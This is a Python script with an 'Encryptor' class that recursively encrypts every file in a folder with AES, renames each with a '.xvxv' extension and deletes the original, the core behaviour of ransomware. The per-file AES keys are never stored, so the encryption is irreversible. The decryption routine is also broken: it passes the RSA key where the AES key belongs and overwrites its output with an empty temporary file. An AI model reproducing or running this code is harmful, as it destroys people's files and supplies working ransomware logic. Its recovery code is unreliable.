import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import tempfile
import shutil

class Encryptor:
    def __init__(self, private_key_path, public_key_path):
        self.private_key_path = private_key_path
        self.public_key_path = public_key_path
        self.private_key = None
        self.public_key = None

        # Check if keys already exist, and load them if they do
        if os.path.exists(private_key_path) and os.path.exists(public_key_path):
            self.private_key = RSA.import_key(open(private_key_path).read())
            self.public_key = RSA.import_key(open(public_key_path).read())
        else:
            # Generate new keys if they don't exist
            self.generate_keys()

    def generate_keys(self):
        if not self.private_key or not self.public_key:
            key = RSA.generate(2048)
            self.private_key = key
            self.public_key = key.publickey()

            with open(self.private_key_path, "wb") as private_key_file:
                private_key_file.write(self.private_key.export_key())
            with open(self.public_key_path, "wb") as public_key_file:
                public_key_file.write(self.public_key.export_key())

    def generate_aes_key(self):
        return get_random_bytes(32)  # 256-bit AES key

    def encrypt_file(self, input_file, session_key):
        # Extract the original file name and extension
        filename, file_extension = os.path.splitext(input_file)
        encrypted_file = f"{filename}{file_extension}.xvxv"

        # Generate a random initialization vector (IV) for AES
        iv = get_random_bytes(16)

        # Create an AES cipher with the session key and IV
        cipher = AES.new(session_key, AES.MODE_CFB, iv)

        with open(input_file, 'rb') as infile, open(encrypted_file, 'wb') as outfile:
            outfile.write(iv)  # Write the IV to the output file
            while True:
                chunk = infile.read(8192)
                if len(chunk) == 0:
                    break
                encrypted_chunk = cipher.encrypt(chunk)
                outfile.write(encrypted_chunk)

        # Remove the original file after successful encryption
        os.remove(input_file)

    def encrypt_files_in_folder(self, folder_path):
        private_key = RSA.import_key(open(self.private_key_path).read())
        public_key = RSA.import_key(open(self.public_key_path).read())

        for root, _, files in os.walk(folder_path):
            for file_name in files:
                input_file_path = os.path.join(root, file_name)

                # Skip already encrypted files
                if file_name.endswith(".xvxv"):
                    print(f"Skipping {file_name}: Already encrypted.")
                    continue

                session_key = self.generate_aes_key()
                encrypted_session_key = PKCS1_OAEP.new(public_key).encrypt(session_key)

                self.encrypt_file(input_file_path, session_key)

                print(f"Encrypted {file_name} successfully.")

    def decrypt_file(self, input_file, session_key):
        with open(input_file, 'rb') as infile:
            iv = infile.read(16)
            cipher = AES.new(session_key, AES.MODE_CFB, iv)
            decrypted_data = b""
            while True:
                chunk = infile.read(8192)
                if not chunk:
                    break
                decrypted_chunk = cipher.decrypt(chunk)
                decrypted_data += decrypted_chunk

        # Extract the original file name without the .xvxv extension
        filename, _ = os.path.splitext(input_file)

        with open(filename, 'wb') as outfile:
            outfile.write(decrypted_data)

    def decrypt_files_in_folder(self, folder_path):
        private_key = RSA.import_key(open(self.private_key_path).read())

        for root, _, files in os.walk(folder_path):
            for file_name in files:
                if file_name.endswith(".xvxv"):
                    input_file_path = os.path.join(root, file_name)

                    # Use a temporary file to store the decrypted content
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        self.decrypt_file(input_file_path, private_key)

                    # Replace the original file with the decrypted content
                    shutil.move(temp_file.name, os.path.join(root, f"{file_name[:-6]}"))
                    os.remove(input_file_path)
                    print(f"Decrypted {file_name} successfully.")